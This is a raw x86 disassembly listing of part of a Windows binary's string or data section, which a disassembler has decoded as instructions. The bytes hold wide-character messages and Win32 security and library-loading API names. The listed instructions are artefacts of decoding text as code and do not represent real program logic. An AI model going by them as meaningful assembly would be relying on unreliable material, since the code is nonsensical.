  40472f:	add    BYTE PTR [eax+eax*1+0x64],ah
  404733:	add    BYTE PTR [edx+0x0],dh
  404736:	add    BYTE PTR gs:[ebx+0x0],dh
  40473a:	jae    0x40473c
  40473c:	and    BYTE PTR [eax],al
  40473e:	data16 add BYTE PTR [ecx+0x0],ah
  404742:	imul   eax,DWORD PTR [eax],0x65006c
  404748:	add    BYTE PTR fs:[eax],ah
  40474b:	add    BYTE PTR [ecx+0x0],ch
  40474e:	outs   dx,BYTE PTR ds:[esi]
  40474f:	add    BYTE PTR [eax],ah
  404751:	add    BYTE PTR [edi+0x0],al
  404754:	add    BYTE PTR gs:[eax+eax*1+0x43],dh
  404759:	add    BYTE PTR [edi+0x0],ch
  40475c:	inc    ebx
  40475d:	add    BYTE PTR [edx+0x0],dh
  404760:	add    BYTE PTR gs:[ecx+0x0],ah
  404764:	je     0x404766
  404766:	add    BYTE PTR gs:[ecx+0x0],cl
  40476a:	outs   dx,BYTE PTR ds:[esi]
  40476b:	add    BYTE PTR [ebx+0x0],dh
  40476e:	je     0x404770
  404770:	popa   
  404771:	add    BYTE PTR [esi+0x0],ch
  404774:	arpl   WORD PTR [eax],ax
  404776:	add    BYTE PTR gs:[ecx+0x0],al
  40477a:	jae    0x40477c
  40477c:	inc    ecx
  40477d:	add    BYTE PTR [eax+eax*1+0x6d],ah
  404781:	add    BYTE PTR [ecx+0x0],ch
  404784:	outs   dx,BYTE PTR ds:[esi]
  404785:	add    BYTE PTR [eax+0x0],cl
  404788:	popa   
  404789:	add    BYTE PTR [esi+0x0],ch
  40478c:	add    BYTE PTR fs:[eax+eax*1+0x65],ch
  404791:	add    BYTE PTR [esi],ch
  404793:	add    BYTE PTR [eax],ah
  404795:	add    BYTE PTR [edi+0x0],al
  404798:	dec    esp
  404799:	add    BYTE PTR [ebp+0x0],al
  40479c:	and    BYTE PTR [eax],al
  40479e:	cmp    eax,0x25002000
  4047a3:	add    BYTE PTR [ebx],ah
  4047a5:	add    BYTE PTR [eax+0x0],bh
	...
  4047b0:	dec    esp
  4047b1:	add    BYTE PTR [edi+0x0],ch
  4047b4:	popa   
  4047b5:	add    BYTE PTR [eax+eax*1+0x4c],ah
  4047b9:	add    BYTE PTR [ecx+0x0],ch
  4047bc:	bound  eax,QWORD PTR [eax]
  4047be:	jb     0x4047c0
  4047c0:	popa   
  4047c1:	add    BYTE PTR [edx+0x0],dh
  4047c4:	jns    0x4047c6
  4047c6:	and    BYTE PTR [eax],al
  4047c8:	data16 add BYTE PTR [ecx+0x0],ah
  4047cc:	imul   eax,DWORD PTR [eax],0x65006c
  4047d2:	add    BYTE PTR fs:[eax],ah
  4047d5:	add    BYTE PTR [ecx+0x0],ch
  4047d8:	outs   dx,BYTE PTR ds:[esi]
  4047d9:	add    BYTE PTR [eax],ah
  4047db:	add    BYTE PTR [ebx+0x0],dl
  4047de:	add    BYTE PTR gs:[eax+eax*1+0x53],dh
  4047e3:	add    BYTE PTR [eax+0x0],ch
  4047e6:	imul   eax,DWORD PTR [eax],0x6c0065
  4047ec:	add    BYTE PTR fs:[ecx+0x0],cl
  4047f0:	arpl   WORD PTR [eax],ax
  4047f2:	outs   dx,DWORD PTR ds:[esi]
  4047f3:	add    BYTE PTR [esi+0x0],ch
  4047f6:	add    BYTE PTR cs:[eax],ah
  4047f9:	add    BYTE PTR [edi+0x0],al
  4047fc:	dec    esp
  4047fd:	add    BYTE PTR [ebp+0x0],al
  404800:	and    BYTE PTR [eax],al
  404802:	cmp    eax,0x25002000
  404807:	add    BYTE PTR [ebx],ah
  404809:	add    BYTE PTR [eax+0x0],bh
  40480c:	add    BYTE PTR [eax],al
  40480e:	add    BYTE PTR [eax],al
  404810:	pop    edi
  404811:	push   ebx
  404812:	gs je  0x404868
  404815:	push   0x646c6569
  40481a:	dec    ecx
  40481b:	arpl   WORD PTR [edi+0x6e],bp
  40481e:	add    BYTE PTR [eax],al
  404820:	inc    edi
  404821:	add    BYTE PTR [ebp+0x0],ah
  404824:	je     0x404826
  404826:	push   eax
  404827:	add    BYTE PTR [edx+0x0],dh
  40482a:	outs   dx,DWORD PTR ds:[esi]
  40482b:	add    BYTE PTR [ebx+0x0],ah
  40482e:	inc    ecx
  40482f:	add    BYTE PTR [eax+eax*1+0x64],ah
  404833:	add    BYTE PTR [edx+0x0],dh
  404836:	add    BYTE PTR gs:[ebx+0x0],dh
  40483a:	jae    0x40483c
  40483c:	and    BYTE PTR [eax],al
  40483e:	data16 add BYTE PTR [ecx+0x0],ah
  404842:	imul   eax,DWORD PTR [eax],0x65006c
  404848:	add    BYTE PTR fs:[eax],ah
  40484b:	add    BYTE PTR [ecx+0x0],ch
  40484e:	outs   dx,BYTE PTR ds:[esi]
  40484f:	add    BYTE PTR [eax],ah
  404851:	add    BYTE PTR [ebx+0x0],dl
  404854:	add    BYTE PTR gs:[eax+eax*1+0x53],dh
  404859:	add    BYTE PTR [eax+0x0],ch
  40485c:	imul   eax,DWORD PTR [eax],0x6c0065
  404862:	add    BYTE PTR fs:[ecx+0x0],cl
  404866:	arpl   WORD PTR [eax],ax
  404868:	outs   dx,DWORD PTR ds:[esi]
  404869:	add    BYTE PTR [esi+0x0],ch
  40486c:	add    BYTE PTR cs:[eax],ah
  40486f:	add    BYTE PTR [edi+0x0],al
  404872:	dec    esp
  404873:	add    BYTE PTR [ebp+0x0],al
  404876:	and    BYTE PTR [eax],al
  404878:	cmp    eax,0x25002000
  40487d:	add    BYTE PTR [ebx],ah
  40487f:	add    BYTE PTR [eax+0x0],bh
  404882:	add    BYTE PTR [eax],al
  404884:	add    BYTE PTR [eax],al
  404886:	add    BYTE PTR [eax],al
  404888:	dec    esp
  404889:	add    BYTE PTR [edi+0x0],ch
  40488c:	popa   
  40488d:	add    BYTE PTR [eax+eax*1+0x4c],ah
  404891:	add    BYTE PTR [ecx+0x0],ch
  404894:	bound  eax,QWORD PTR [eax]
  404896:	jb     0x404898
  404898:	popa   
  404899:	add    BYTE PTR [edx+0x0],dh
  40489c:	jns    0x40489e
  40489e:	and    BYTE PTR [eax],al
  4048a0:	data16 add BYTE PTR [ecx+0x0],ah
  4048a4:	imul   eax,DWORD PTR [eax],0x65006c
  4048aa:	add    BYTE PTR fs:[eax],ah
  4048ad:	add    BYTE PTR [ecx+0x0],ch
  4048b0:	outs   dx,BYTE PTR ds:[esi]
  4048b1:	add    BYTE PTR [eax],ah
  4048b3:	add    BYTE PTR [edx+0x0],dl
  4048b6:	add    BYTE PTR gs:[ebp+0x0],ch
  4048ba:	outs   dx,DWORD PTR ds:[esi]
  4048bb:	add    BYTE PTR [esi+0x0],dh
  4048be:	add    BYTE PTR gs:[ebx+0x0],dl
  4048c2:	push   0x65006900
  4048c7:	add    BYTE PTR [eax+eax*1+0x64],ch
  4048cb:	add    BYTE PTR [ecx+0x0],cl
  4048ce:	arpl   WORD PTR [eax],ax
  4048d0:	outs   dx,DWORD PTR ds:[esi]
  4048d1:	add    BYTE PTR [esi+0x0],ch
  4048d4:	add    BYTE PTR cs:[eax],ah
  4048d7:	add    BYTE PTR [edi+0x0],al
  4048da:	dec    esp
  4048db:	add    BYTE PTR [ebp+0x0],al
  4048de:	and    BYTE PTR [eax],al
  4048e0:	cmp    eax,0x25002000
  4048e5:	add    BYTE PTR [ebx],ah
  4048e7:	add    BYTE PTR [eax+0x0],bh
  4048ea:	add    BYTE PTR [eax],al
  4048ec:	pop    edi
  4048ed:	push   edx
  4048ee:	gs ins DWORD PTR es:[edi],dx
  4048f0:	outs   dx,DWORD PTR ds:[esi]
  4048f1:	jbe    0x404958
  4048f3:	push   ebx
  4048f4:	push   0x646c6569
  4048f9:	dec    ecx
  4048fa:	arpl   WORD PTR [edi+0x6e],bp
  4048fd:	add    BYTE PTR [eax],al
  4048ff:	add    BYTE PTR [edi+0x0],al
  404902:	add    BYTE PTR gs:[eax+eax*1+0x50],dh
  404907:	add    BYTE PTR [edx+0x0],dh
  40490a:	outs   dx,DWORD PTR ds:[esi]
  40490b:	add    BYTE PTR [ebx+0x0],ah
  40490e:	inc    ecx
  40490f:	add    BYTE PTR [eax+eax*1+0x64],ah
  404913:	add    BYTE PTR [edx+0x0],dh
  404916:	add    BYTE PTR gs:[ebx+0x0],dh
  40491a:	jae    0x40491c
  40491c:	and    BYTE PTR [eax],al
  40491e:	data16 add BYTE PTR [ecx+0x0],ah
  404922:	imul   eax,DWORD PTR [eax],0x65006c
  404928:	add    BYTE PTR fs:[eax],ah
  40492b:	add    BYTE PTR [ecx+0x0],ch
  40492e:	outs   dx,BYTE PTR ds:[esi]
  40492f:	add    BYTE PTR [eax],ah
  404931:	add    BYTE PTR [edx+0x0],dl
  404934:	add    BYTE PTR gs:[ebp+0x0],ch
  404938:	outs   dx,DWORD PTR ds:[esi]
  404939:	add    BYTE PTR [esi+0x0],dh
  40493c:	add    BYTE PTR gs:[ebx+0x0],dl
  404940:	push   0x65006900
  404945:	add    BYTE PTR [eax+eax*1+0x64],ch
  404949:	add    BYTE PTR [ecx+0x0],cl
  40494c:	arpl   WORD PTR [eax],ax
  40494e:	outs   dx,DWORD PTR ds:[esi]
  40494f:	add    BYTE PTR [esi+0x0],ch
  404952:	add    BYTE PTR cs:[eax],ah
  404955:	add    BYTE PTR [edi+0x0],al
  404958:	dec    esp
  404959:	add    BYTE PTR [ebp+0x0],al
  40495c:	and    BYTE PTR [eax],al
  40495e:	cmp    eax,0x25002000
  404963:	add    BYTE PTR [ebx],ah
  404965:	add    BYTE PTR [eax+0x0],bh
	...
  404970:	push   eax
  404971:	add    BYTE PTR [edx+0x0],dh
  404974:	outs   dx,DWORD PTR ds:[esi]
  404975:	add    BYTE PTR [ebx+0x0],ah
  404978:	add    BYTE PTR gs:[ebx+0x0],dh
  40497c:	jae    0x40497e
  40497e:	inc    ebx
  40497f:	add    BYTE PTR [ebp+0x0],ch
  404982:	add    BYTE PTR fs:[eax+eax*1+0x6e],cl
  404987:	add    BYTE PTR [eax],ah
  404989:	add    BYTE PTR ds:0x56002000,ch
  40498f:	add    BYTE PTR [ecx+0x0],ah
  404992:	ins    BYTE PTR es:[edi],dx
  404993:	add    BYTE PTR [ecx+0x0],ch
  404996:	add    BYTE PTR fs:[ebx+0x0],dl
  40499a:	ja     0x40499c
  40499c:	imul   eax,DWORD PTR [eax],0x630074
  4049a2:	push   0x69002000
  4049a7:	add    BYTE PTR [ebx+0x0],dh
  4049aa:	and    BYTE PTR [eax],al
  4049ac:	and    eax,0x7300
  4049b1:	add    BYTE PTR [eax],al
  4049b3:	add    BYTE PTR [eax],al
  4049b5:	add    BYTE PTR [eax],al
  4049b7:	add    BYTE PTR [eax+0x0],dl
  4049ba:	jb     0x4049bc
  4049bc:	outs   dx,DWORD PTR ds:[esi]
  4049bd:	add    BYTE PTR [ebx+0x0],ah
  4049c0:	add    BYTE PTR gs:[ebx+0x0],dh
  4049c4:	jae    0x4049c6
  4049c6:	inc    ebx
  4049c7:	add    BYTE PTR [ebp+0x0],ch
  4049ca:	add    BYTE PTR fs:[eax+eax*1+0x6e],cl
  4049cf:	add    BYTE PTR [eax],ah
  4049d1:	add    BYTE PTR ds:0x56002000,ch
  4049d7:	add    BYTE PTR [ecx+0x0],ah
  4049da:	ins    BYTE PTR es:[edi],dx
  4049db:	add    BYTE PTR [ecx+0x0],ch
  4049de:	add    BYTE PTR fs:[esi+0x0],al
  4049e2:	imul   eax,DWORD PTR [eax],0x65006c
  4049e8:	push   eax
  4049e9:	add    BYTE PTR [ecx+0x0],ah
  4049ec:	je     0x4049ee
  4049ee:	push   0x69002000
  4049f3:	add    BYTE PTR [ebx+0x0],dh
  4049f6:	and    BYTE PTR [eax],al
  4049f8:	and    eax,0x7300
  4049fd:	add    BYTE PTR [eax],al
  4049ff:	add    BYTE PTR [eax+0x0],dl
  404a02:	jb     0x404a04
  404a04:	outs   dx,DWORD PTR ds:[esi]
  404a05:	add    BYTE PTR [ebx+0x0],ah
  404a08:	add    BYTE PTR gs:[ebx+0x0],dh
  404a0c:	jae    0x404a0e
  404a0e:	inc    ebx
  404a0f:	add    BYTE PTR [ebp+0x0],ch
  404a12:	add    BYTE PTR fs:[eax+eax*1+0x6e],cl
  404a17:	add    BYTE PTR [eax],ah
  404a19:	add    BYTE PTR ds:0x65002000,ch
  404a1f:	add    BYTE PTR [eax+0x0],bh
  404a22:	jo     0x404a24
  404a24:	popa   
  404a25:	add    BYTE PTR [esi+0x0],ch
  404a28:	add    BYTE PTR fs:[ebp+0x0],ah
  404a2c:	add    BYTE PTR fs:[eax],ah
  404a2f:	add    BYTE PTR [eax+0x0],dh
  404a32:	popa   
  404a33:	add    BYTE PTR [eax+eax*1+0x68],dh
  404a37:	add    BYTE PTR [eax],ah
  404a39:	add    BYTE PTR [ecx+0x0],ch
  404a3c:	jae    0x404a3e
  404a3e:	and    BYTE PTR [eax],al
  404a40:	and    eax,0x7300
  404a45:	add    BYTE PTR [eax],al
  404a47:	add    BYTE PTR [eax+0x0],dl
  404a4a:	jb     0x404a4c
  404a4c:	outs   dx,DWORD PTR ds:[esi]
  404a4d:	add    BYTE PTR [ebx+0x0],ah
  404a50:	add    BYTE PTR gs:[ebx+0x0],dh
  404a54:	jae    0x404a56
  404a56:	inc    ebx
  404a57:	add    BYTE PTR [ebp+0x0],ch
  404a5a:	add    BYTE PTR fs:[eax+eax*1+0x6e],cl
  404a5f:	add    BYTE PTR [eax],ah
  404a61:	add    BYTE PTR ds:0x25002000,ch
  404a67:	add    BYTE PTR [ebx+0x0],dh
  404a6a:	and    BYTE PTR [eax],al
  404a6c:	imul   eax,DWORD PTR [eax],0x200073
  404a72:	outs   dx,BYTE PTR ds:[esi]
  404a73:	add    BYTE PTR [edi+0x0],ch
  404a76:	je     0x404a78
  404a78:	and    BYTE PTR [eax],al
  404a7a:	popa   
  404a7b:	add    BYTE PTR [eax],ah
  404a7d:	add    BYTE PTR [esi+0x0],dh
  404a80:	popa   
  404a81:	add    BYTE PTR [eax+eax*1+0x69],ch
  404a85:	add    BYTE PTR [eax+eax*1+0x20],ah
  404a89:	add    BYTE PTR [eax+0x0],dh
  404a8c:	popa   
  404a8d:	add    BYTE PTR [eax+eax*1+0x68],dh
  404a91:	add    BYTE PTR [eax],al
  404a93:	add    BYTE PTR [eax],al
  404a95:	add    BYTE PTR [eax],al
  404a97:	add    BYTE PTR [eax+0x0],dl
  404a9a:	jb     0x404a9c
  404a9c:	outs   dx,DWORD PTR ds:[esi]
  404a9d:	add    BYTE PTR [ebx+0x0],ah
  404aa0:	add    BYTE PTR gs:[ebx+0x0],dh
  404aa4:	jae    0x404aa6
  404aa6:	inc    ebx
  404aa7:	add    BYTE PTR [ebp+0x0],ch
  404aaa:	add    BYTE PTR fs:[eax+eax*1+0x6e],cl
  404aaf:	add    BYTE PTR [eax],ah
  404ab1:	add    BYTE PTR ds:0x49002000,ch
  404ab7:	add    BYTE PTR [esi+0x0],ch
  404aba:	jbe    0x404abc
  404abc:	popa   
  404abd:	add    BYTE PTR [eax+eax*1+0x69],ch
  404ac1:	add    BYTE PTR [eax+eax*1+0x20],ah
  404ac5:	add    BYTE PTR [eax+eax*1+0x6f],dh
  404ac9:	add    BYTE PTR [ebx+0x0],ch
  404acc:	add    BYTE PTR gs:[esi+0x0],ch
  404ad0:	and    BYTE PTR [eax],al
  404ad2:	imul   eax,DWORD PTR [eax],0x200073
  404ad8:	and    eax,0x7300
  404add:	add    BYTE PTR [eax],al
  404adf:	add    BYTE PTR [ebx+0x0],al
  404ae2:	push   eax
  404ae3:	add    BYTE PTR [edx+0x0],dh
  404ae6:	outs   dx,DWORD PTR ds:[esi]
  404ae7:	add    BYTE PTR [ebx+0x0],ah
  404aea:	add    BYTE PTR gs:[ebx+0x0],dh
  404aee:	jae    0x404af0
  404af0:	inc    ebx
  404af1:	add    BYTE PTR [ebp+0x0],ch
  404af4:	add    BYTE PTR fs:[eax+eax*1+0x6e],cl
  404af9:	add    BYTE PTR [edx],bh
  404afb:	add    BYTE PTR [edx],bh
  404afd:	add    BYTE PTR [edi+0x0],al
  404b00:	add    BYTE PTR gs:[eax+eax*1+0x43],dh
  404b05:	add    BYTE PTR [ebp+0x0],ch
  404b08:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  404b0d:	add    BYTE PTR [esi+0x0],ch
  404b10:	add    BYTE PTR gs:[ecx+0x0],al
  404b14:	jb     0x404b16
  404b16:	add    BYTE PTR [bp+di+0x0],dh
  404b1a:	and    BYTE PTR [eax],al
  404b1c:	sub    eax,0x43002000
  404b21:	add    BYTE PTR [edi+0x0],ch
  404b24:	ins    DWORD PTR es:[edi],dx
  404b25:	add    BYTE PTR [ebp+0x0],ch
  404b28:	popa   
  404b29:	add    BYTE PTR [esi+0x0],ch
  404b2c:	add    BYTE PTR fs:[eax],ah
  404b2f:	add    BYTE PTR [eax+eax*1+0x69],ch
  404b33:	add    BYTE PTR [esi+0x0],ch
  404b36:	add    BYTE PTR gs:[eax],ah
  404b39:	add    BYTE PTR [ecx+0x0],ch
  404b3c:	jae    0x404b3e
  404b3e:	and    BYTE PTR [eax],al
  404b40:	and    eax,0x7300
  404b45:	add    BYTE PTR [eax],al
  404b47:	add    BYTE PTR [eax+eax*1+0x68],dl
  404b4b:	add    BYTE PTR [edx+0x0],dh
  404b4e:	outs   dx,DWORD PTR ds:[esi]
  404b4f:	add    BYTE PTR [edi+0x0],dh
  404b52:	imul   eax,DWORD PTR [eax],0x67006e
  404b58:	and    BYTE PTR [eax],al
  404b5a:	popa   
  404b5b:	add    BYTE PTR [edi+0x0],dh
  404b5e:	popa   
  404b5f:	add    BYTE PTR [ecx+0x0],bh
  404b62:	sub    al,0x0
  404b64:	and    BYTE PTR [eax],al
  404b66:	data16 add BYTE PTR [ecx+0x0],ch
  404b6a:	jb     0x404b6c
  404b6c:	jae    0x404b6e
  404b6e:	je     0x404b70
  404b70:	and    BYTE PTR [eax],al
  404b72:	je     0x404b74
  404b74:	outs   dx,DWORD PTR ds:[esi]
  404b75:	add    BYTE PTR [ebx+0x0],ch
  404b78:	add    BYTE PTR gs:[esi+0x0],ch
  404b7c:	cmp    al,BYTE PTR [eax]
  404b7e:	and    BYTE PTR [eax],al
  404b80:	and    eax,0x7300
  404b85:	add    BYTE PTR [eax],al
  404b87:	add    BYTE PTR [ecx+ebp*2+0x6e],cl
  404b8b:	imul   edx,DWORD PTR [edi+ebp*2+0x44],0x6c
  404b90:	ins    BYTE PTR es:[edi],dx
  404b91:	and    BYTE PTR ds:0x616f4c20,ch
  404b97:	imul   ebp,DWORD PTR fs:[esi+0x67],0x62696c20
  404b9f:	jb     0x404c02
  404ba1:	jb     0x404c1c
  404ba3:	and    BYTE PTR ds:0x732520,ch
  404ba9:	add    BYTE PTR [eax],al
  404bab:	add    BYTE PTR [eax],ch
  404bad:	outs   dx,BYTE PTR ds:[esi]
  404bae:	jne    0x404c1c
  404bb0:	ins    BYTE PTR es:[edi],dx
  404bb1:	sub    DWORD PTR [eax],eax
  404bb3:	add    BYTE PTR [ecx+ebp*2+0x6e],cl
  404bb7:	imul   edx,DWORD PTR [edi+ebp*2+0x44],0x6c
  404bbc:	ins    BYTE PTR es:[edi],dx
  404bbd:	pop    ebx
  404bbe:	jo     0x404c28
  404bc0:	dec    ecx
  404bc1:	outs   dx,BYTE PTR ds:[esi]
  404bc2:	jae    0x404c38
  404bc4:	cmp    eax,0x202c7025
  404bc9:	sub    dh,BYTE PTR [eax+0x73]
  404bcc:	jp     0x404c12
  404bce:	ins    BYTE PTR es:[edi],dx
  404bcf:	ins    BYTE PTR es:[edi],dx
  404bd0:	cmp    eax,0x202c7325
  404bd5:	jo     0x404c47
  404bd7:	jae    0x404c53
  404bd9:	push   eax
  404bda:	data16 outs dx,BYTE PTR ds:[esi]
  404bdc:	cmp    eax,0x2c7025
  404be1:	add    BYTE PTR [eax],al
  404be3:	add    BYTE PTR [ecx],cl
  404be5:	jo     0x404c57
  404be7:	jbe    0x404c39
  404be9:	data16 outs dx,BYTE PTR ds:[esi]
  404beb:	cmp    eax,0x205d7025
  404bf0:	dec    esp
  404bf1:	outs   dx,DWORD PTR ds:[esi]
  404bf2:	popa   
  404bf3:	fs dec esp
  404bf5:	imul   esp,DWORD PTR [edx+0x72],0x28797261
  404bfc:	sub    DWORD PTR [eax],esp
  404bfe:	popaw  
  404c00:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x2e
  404c08:	inc    edx
  404c09:	add    BYTE PTR [ecx+0x0],ch
  404c0c:	outs   dx,BYTE PTR ds:[esi]
  404c0d:	add    BYTE PTR [eax+eax*1+0x4c],ah
  404c11:	add    BYTE PTR [ecx+0x0],ch
  404c14:	outs   dx,BYTE PTR ds:[esi]
  404c15:	add    BYTE PTR [ebx+0x0],ch
  404c18:	popa   
  404c19:	add    BYTE PTR [edi+0x0],ah
  404c1c:	add    BYTE PTR gs:[eax],ch
  404c1f:	add    BYTE PTR [eax+0x0],ch
  404c22:	dec    ecx
  404c23:	add    BYTE PTR [esi+0x0],ch
  404c26:	jae    0x404c28
  404c28:	je     0x404c2a
  404c2a:	inc    esp
  404c2b:	add    BYTE PTR [eax+eax*1+0x6c],ch
  404c2f:	add    BYTE PTR ds:0x64002500,bh
  404c35:	add    BYTE PTR [eax+eax*1],ch
  404c38:	jo     0x404c3a
  404c3a:	jo     0x404c3c
  404c3c:	jae    0x404c3e
  404c3e:	jp     0x404c40
  404c40:	push   eax
  404c41:	add    BYTE PTR [esi+0x0],ah
  404c44:	outs   dx,BYTE PTR ds:[esi]
  404c45:	add    BYTE PTR ds:0x70002500,bh
  404c4b:	add    BYTE PTR [eax+eax*1],ch
  404c4e:	jo     0x404c50
  404c50:	jo     0x404c52
  404c52:	jbe    0x404c54
  404c54:	push   eax
  404c55:	add    BYTE PTR [esi+0x0],ah
  404c58:	outs   dx,BYTE PTR ds:[esi]
  404c59:	add    BYTE PTR ds:0x70002500,bh
  404c5f:	add    BYTE PTR [ecx],ch
  404c61:	add    BYTE PTR [eax],al
  404c63:	add    BYTE PTR [eax],al
  404c65:	add    BYTE PTR [eax],al
  404c67:	add    BYTE PTR [ecx],cl
  404c69:	add    BYTE PTR [edi+0x0],al
  404c6c:	add    BYTE PTR gs:[eax+eax*1+0x50],dh
  404c71:	add    BYTE PTR [edx+0x0],dh
  404c74:	outs   dx,DWORD PTR ds:[esi]
  404c75:	add    BYTE PTR [ebx+0x0],ah
  404c78:	inc    ecx
  404c79:	add    BYTE PTR [eax+eax*1+0x64],ah
  404c7d:	add    BYTE PTR [edx+0x0],dh
  404c80:	add    BYTE PTR gs:[ebx+0x0],dh
  404c84:	jae    0x404c86
  404c86:	sub    BYTE PTR [eax],al
  404c88:	push   0x6e004900
  404c8d:	add    BYTE PTR [ebx+0x0],dh
  404c90:	je     0x404c92
  404c92:	inc    esp
  404c93:	add    BYTE PTR [eax+eax*1+0x6c],ch
  404c97:	add    BYTE PTR ds:0x64002500,bh
  404c9d:	add    BYTE PTR [eax+eax*1],ch
  404ca0:	sub    al,BYTE PTR [eax]
  404ca2:	jo     0x404ca4
  404ca4:	jae    0x404ca6
  404ca6:	jp     0x404ca8
  404ca8:	push   eax
  404ca9:	add    BYTE PTR [edx+0x0],dh
  404cac:	outs   dx,DWORD PTR ds:[esi]
  404cad:	add    BYTE PTR [ebx+0x0],ah
  404cb0:	cmp    eax,0x53002500
  404cb5:	add    BYTE PTR [ecx],ch
  404cb7:	add    BYTE PTR [eax],ah
  404cb9:	add    BYTE PTR [esi+0x0],ah
  404cbc:	popa   
  404cbd:	add    BYTE PTR [ecx+0x0],ch
  404cc0:	ins    BYTE PTR es:[edi],dx
  404cc1:	add    BYTE PTR [ebp+0x0],ah
  404cc4:	add    BYTE PTR fs:[eax+eax*1],ch
  404cc8:	and    BYTE PTR [eax],al
  404cca:	inc    edi
  404ccb:	add    BYTE PTR [eax+eax*1+0x45],cl
  404ccf:	add    BYTE PTR ds:0x75002500,bh
  404cd5:	add    BYTE PTR [esi],ch
  404cd7:	add    BYTE PTR [eax],al
  404cd9:	add    BYTE PTR [eax],al
  404cdb:	add    BYTE PTR [edi+0x65],al
  404cde:	je     0x404d33
  404ce0:	imul   esp,DWORD PTR [esp+ecx*2+0x65],0x6874676e
  404ce8:	push   edx
  404ce9:	gs jno 0x404d61
  404cec:	imul   esi,DWORD PTR [edx+0x65],0x64
  404cf3:	add    BYTE PTR [ecx+0x6e],cl
  404cf6:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  404cfe:	push   ebx
  404cff:	imul   esp,DWORD PTR [eax+eax*1+0x0],0x74654700
  404d07:	push   ebx
  404d08:	imul   esp,DWORD PTR [ebx+edx*2+0x75],0x74754162
  404d10:	push   0x7469726f
  404d15:	jns    0x404d17
  404d17:	add    BYTE PTR [ecx+0x6e],cl
  404d1a:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  404d22:	inc    ecx
  404d23:	arpl   WORD PTR [eax+eax*1+0x0],bp
  404d27:	add    BYTE PTR [ecx+0x64],al
  404d2a:	fs inc ecx
  404d2c:	arpl   WORD PTR [ebx+0x65],sp
  404d2f:	jae    0x404da4
  404d31:	inc    ecx
  404d32:	ins    BYTE PTR es:[edi],dx
  404d33:	ins    BYTE PTR es:[edi],dx
  404d34:	outs   dx,DWORD PTR ds:[esi]
  404d35:	ja     0x404d9c
  404d37:	fs inc ecx
  404d39:	arpl   WORD PTR [ebp+0x45],sp
  404d3c:	js     0x404d3e
  404d3e:	add    BYTE PTR [eax],al
  404d40:	dec    ecx
  404d41:	outs   dx,BYTE PTR ds:[esi]
  404d42:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  404d4a:	push   ebx
  404d4b:	arpl   WORD PTR gs:[ebp+0x72],si
  404d4f:	imul   esi,DWORD PTR [ecx+edi*2+0x44],0x72637365
  404d57:	imul   esi,DWORD PTR [eax+0x74],0x726f
  404d5e:	add    BYTE PTR [eax],al
  404d60:	push   ebx
  404d61:	gs je  0x404db7
  404d64:	arpl   WORD PTR gs:[ebp+0x72],si
  404d68:	imul   esi,DWORD PTR [ecx+edi*2+0x44],0x72637365
  404d70:	imul   esi,DWORD PTR [eax+0x74],0x6144726f
  404d77:	arpl   WORD PTR [eax+eax*1+0x0],bp
  404d7b:	add    BYTE PTR [ebx+0x65],dl
  404d7e:	je     0x404dd3
  404d80:	arpl   WORD PTR gs:[ebp+0x72],si
  404d84:	imul   esi,DWORD PTR [ecx+edi*2+0x44],0x72637365
  404d8c:	imul   esi,DWORD PTR [eax+0x74],0x774f726f
  404d93:	outs   dx,BYTE PTR ds:[esi]
  404d94:	gs jb  0x404d97
  404d97:	add    BYTE PTR [ebx+0x65],dl
  404d9a:	je     0x404def
  404d9c:	arpl   WORD PTR gs:[ebp+0x72],si
  404da0:	imul   esi,DWORD PTR [ecx+edi*2+0x44],0x72637365
  404da8:	imul   esi,DWORD PTR [eax+0x74],0x7247726f
  404daf:	outs   dx,DWORD PTR ds:[esi]
  404db0:	jne    0x404e22
  404db2:	add    BYTE PTR [eax],al
  404db4:	inc    edi
  404db5:	gs je  0x404e0b
  404db8:	arpl   WORD PTR gs:[ebp+0x72],si
  404dbc:	imul   esi,DWORD PTR [ecx+edi*2+0x44],0x72637365
  404dc4:	imul   esi,DWORD PTR [eax+0x74],0x6144726f
  404dcb:	arpl   WORD PTR [eax+eax*1+0x0],bp
  404dcf:	add    BYTE PTR [ecx+0x0],al
  404dd2:	ins    BYTE PTR es:[edi],dx
  404dd3:	add    BYTE PTR [eax+eax*1+0x6f],ch
  404dd7:	add    BYTE PTR [ebx+0x0],ah
  404dda:	popa   
  404ddb:	add    BYTE PTR [eax+eax*1+0x65],dh
  404ddf:	add    BYTE PTR [ebx+0x0],dl
  404de2:	add    BYTE PTR gs:[ebx+0x0],ah
  404de6:	jne    0x404de8
  404de8:	jb     0x404dea
  404dea:	imul   eax,DWORD PTR [eax],0x790074
  404df0:	inc    esp
  404df1:	add    BYTE PTR [ebp+0x0],ah
  404df4:	jae    0x404df6
  404df6:	arpl   WORD PTR [eax],ax
  404df8:	jb     0x404dfa
  404dfa:	imul   eax,DWORD PTR [eax],0x740070
  404e00:	outs   dx,DWORD PTR ds:[esi]
  404e01:	add    BYTE PTR [edx+0x0],dh
  404e04:	inc    ecx
  404e05:	add    BYTE PTR [eax+eax*1+0x6c],ch
  404e09:	add    BYTE PTR [edi+0x0],ch
  404e0c:	ja     0x404e0e
  404e0e:	inc    ecx
  404e0f:	add    BYTE PTR [ebx+0x0],ah
  404e12:	arpl   WORD PTR [eax],ax
  404e14:	add    BYTE PTR gs:[ebx+0x0],dh
  404e18:	jae    0x404e1a
  404e1a:	push   esp
  404e1b:	add    BYTE PTR [edi+0x0],ch
  404e1e:	push   edi
  404e1f:	add    BYTE PTR [edi+0x0],ch
  404e22:	jb     0x404e24
  404e24:	ins    BYTE PTR es:[edi],dx
  404e25:	add    BYTE PTR [eax+eax*1+0x28],ah
  404e29:	add    BYTE PTR [ecx],ch
  404e2b:	add    BYTE PTR [eax],ah
  404e2d:	add    BYTE PTR ds:0x41002000,ch
  404e33:	add    BYTE PTR [edx+0x0],dh
  404e36:	imul   eax,DWORD PTR [eax],0x680074
  404e3c:	ins    DWORD PTR es:[edi],dx
  404e3d:	add    BYTE PTR [ebp+0x0],ah
  404e40:	je     0x404e42
  404e42:	imul   eax,DWORD PTR [eax],0x200063
  404e48:	outs   dx,DWORD PTR ds:[esi]
  404e49:	add    BYTE PTR [eax+0x0],dh
  404e4c:	add    BYTE PTR gs:[edx+0x0],dh
  404e50:	popa   
  404e51:	add    BYTE PTR [eax+eax*1+0x69],dh
